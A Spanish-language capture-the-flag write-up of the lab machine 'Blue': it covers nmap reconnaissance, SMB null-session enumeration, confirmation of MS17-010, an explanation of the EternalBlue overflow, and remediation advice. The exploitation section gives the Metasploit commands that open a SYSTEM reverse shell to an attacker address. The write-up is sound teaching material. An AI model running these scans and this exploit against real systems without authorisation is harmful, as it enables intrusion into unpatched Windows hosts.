## Resumen

Blue es de esas máquinas que te suben la moral. Un Windows 7 al que nunca le pasaron el parche de MS17-010, así que todo el trabajo está en darse cuenta de que el SMB está vulnerable. A partir de ahí lanzas EternalBlue y ya estás dentro como SYSTEM, sin escalada ni nada de por medio. Si vienes de máquinas Linux donde te tiras media tarde buscando un `sudo` mal puesto, esta se hace en un rato.

## Reconocimiento

Empiezo con el escaneo de puertos de siempre:

```console
jaime@kali:~$ nmap -p- -n -Pn -sS --max-retries 1 10.10.10.40
```

| Parámetro | Qué hace |
| --- | --- |
| `-p-` | Los 65535 puertos. Sin esto nmap solo mira los 1000 más comunes |
| `-n` | No resuelve DNS. En el laboratorio no hay servidor de nombres, así que es tiempo perdido |
| `-Pn` | Da el host por vivo sin hacer ping. Imprescindible en Windows, que bloquea ICMP por defecto |
| `-sS` | *SYN scan*: manda el SYN y corta antes de completar el saludo. Más rápido y más discreto |
| `--max-retries 1` | Un solo reintento por puerto. Acelera mucho el escaneo |

> Si aun así va lento, le meto `--min-rate 5000` o `-T4`.
{: .prompt-tip }

Quitando los puertos de cinco cifras, que son el rango dinámico de RPC y no aportan nada, quedan tres:

| Puerto | Servicio |
| --- | --- |
| 135 | msrpc |
| 139 | netbios-ssn |
| 445 | microsoft-ds |

Ni web, ni FTP, ni SSH. Toda la superficie de ataque es SMB, así que el camino ya está bastante marcado.

Ahora las versiones:

```console
jaime@kali:~$ nmap -p135,139,445 -n -sCV --version-intensity 9 10.10.10.40
```

`-sV` identifica la versión de cada servicio, `-sC` lanza los scripts por defecto y `--version-intensity 9` sube al máximo el número de sondas que envía para afinar la detección.

```
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1
|   Computer name: haris-PC
|   Workgroup: WORKGROUP
| smb-security-mode:
|   message_signing: disabled (dangerous)
```

Tres cosas que me llevo:

- **Windows 7 SP1**, sin soporte desde 2020.
- **`haris-PC`**. El nombre del equipo suele llevar el del usuario, así que apunto que probablemente exista un usuario `haris`.
- **Firma de mensajes deshabilitada**. Aquí no la aprovecho, pero en un dominio permitiría ataques de retransmisión SMB.

## Enumeración

Listo los recursos compartidos con una sesión nula, es decir, sin enviar credenciales:

```console
jaime@kali:~$ smbclient -L //10.10.10.40/ -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk
Users           Disk
```

**5 recursos**, y conviene saber qué es cada uno:

| Recurso | Qué es |
| --- | --- |
| `ADMIN$`, `C$` | Administrativos ocultos, los crea Windows solo. Piden credenciales de administrador |
| `IPC$` | Canal de comunicación entre procesos. Es el que permite la sesión nula y el que usan los exploits de SMB |
| `Share`, `Users` | Creados a mano, los interesantes en principio |

Intento entrar en `Share` y `Users` sin credenciales y los dos me deniegan el acceso. Da igual: el fallo no está en los permisos, está en el propio protocolo. Lo compruebo con los scripts de vulnerabilidades:

```console
jaime@kali:~$ nmap -p445 --script smb-vuln-* 10.10.10.40
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

Ahí está. Y de paso confirma que el servidor sigue hablando **SMBv1**.

## La vulnerabilidad

| | |
| --- | --- |
| **CVE** | CVE-2017-0143 |
| **Boletín** | MS17-010 (marzo de 2017) |
| **Exploit** | EternalBlue |
| **Origen** | Desarrollado por la NSA y filtrado por Shadow Brokers en abril de 2017 |
| **Servicio** | SMBv1 (`srv.sys`), puerto 445 |
| **Afecta a** | Desde Windows XP hasta Windows 10 y Server 2016 sin parchear |
| **CVSS v3** | 8.1 (alta) |

SMBv1 arrastra compatibilidad con OS/2 y tiene que convertir sus listas de atributos extendidos de archivo al formato de Windows NT. En esa conversión se calcula mal el tamaño: se reserva un espacio y luego se copia más de lo que cabe. El resultado es un desbordamiento de búfer en memoria del kernel.

Como `srv.sys` es un controlador que corre en el kernel, el código acaba ejecutándose con los máximos privilegios del sistema. Por eso la shell entra directamente como `NT AUTHORITY\SYSTEM`, sin pasar por ningún usuario intermedio. Esta es la misma vulnerabilidad que usó WannaCry en mayo de 2017 para propagarse solo de equipo en equipo.

## Explotación

Tiro del módulo de Metasploit:

```console
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.X
msf6 exploit(ms17_010_eternalblue) > set LPORT 443
msf6 exploit(ms17_010_eternalblue) > run
```

## Cómo se arregla

1. **Aplicar MS17-010.** El parche está disponible desde marzo de 2017, incluso para XP y Server 2003, que ya estaban sin soporte.
2. **Desactivar SMBv1:** `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`.
3. **No exponer el puerto 445** fuera de la red interna.
4. **Activar la firma SMB**, que el escaneo señalaba como deshabilitada.

## Conclusiones

Como conclusiones saco que el SMBv1 a estas alturas no debería de existir, es un servicio anticuado con muchas vulnerabilidades conocidas. En este caso encima la vulnerabilidad nos ha dado root nada más ejecutarla.

Es buena práctica al ver el puerto 445 abierto tirar directamente `nmap --script smb-vuln-*`, que resuelve casi todo el reconocimiento.

El parche existía un mes antes de la filtración y casi dos antes de WannaCry. El problema casi nunca es que no haya solución, sino que no se aplica.
